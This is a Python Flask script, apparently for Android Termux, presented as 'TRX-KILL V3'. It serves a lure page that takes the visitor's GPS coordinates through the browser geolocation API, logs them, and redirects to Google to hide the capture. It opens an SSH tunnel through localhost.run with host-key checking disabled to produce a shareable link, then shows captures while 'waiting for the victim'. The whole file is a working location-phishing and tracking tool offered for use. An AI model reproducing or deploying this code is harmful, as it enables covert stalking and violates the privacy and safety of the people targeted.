import os, sys, time, threading
from flask import Flask, request

STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
LOG_FILE = f"{STORAGE_PATH}/result.txt"
if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)

app = Flask('TRX-KILL')
logging = __import__('logging')
logging.getLogger('werkzeug').setLevel(logging.ERROR)

G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m"

@app.route('/')
def index():
    return """<html><body><script>
        navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
            window.location.href='https://www.google.com';
        });
    </script></html>"""

@app.route('/log')
def log():
    with open(LOG_FILE, "a") as f:
        f.write(f"GPS: {request.args.get('lat')},{request.args.get('lon')}\n")
    return "OK"

def main():
    # 1. Limpiar puertos
    os.system("fuser -k 5000/tcp > /dev/null 2>&1")
    # 2. Iniciar servidor
    threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False), daemon=True).start()
    
    while True:
        os.system('clear')
        print(f"{G}--- TRX-KILL V3 (MENÚ PRINCIPAL) ---{W}")
        print("[1] RASTREAR | [2] LINK-ZP (AUTO) | [0] SALIR")
        sel = input("\nTRX-ROOT > ")

        if sel == "2":
            os.system('clear')
            print(f"{C}--- GENERANDO LINK AUTOMÁTICO ---{W}")
            # Lanzamos el túnel de forma invisible
            os.system("ssh -o StrictHostKeyChecking=no -R 80:localhost:5000 ssh.localhost.run > /sdcard/link.txt 2>&1 &")
            print(f"{G}Túnel iniciado. Esperando link...{W}")
            time.sleep(5)
            # Leemos el link generado por el comando
            os.system("grep -o 'https://[a-z0-9.-]*' /sdcard/link.txt > /sdcard/link_final.txt")
            
            print(f"{Y}TU LINK ES:{W}")
            os.system("cat /sdcard/link_final.txt")
            print(f"\n{C}ESPERANDO VÍCTIMA... (Escribe '0' para volver){W}")
            
            while True:
                time.sleep(2)
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, 'r') as f:
                        lines = f.readlines()
                        if lines:
                            print(f"{G}CAPTURA:{W} {lines[-1].strip()}")
                if input() == '0': break
        elif sel == "0": sys.exit()

if __name__ == "__main__": main()
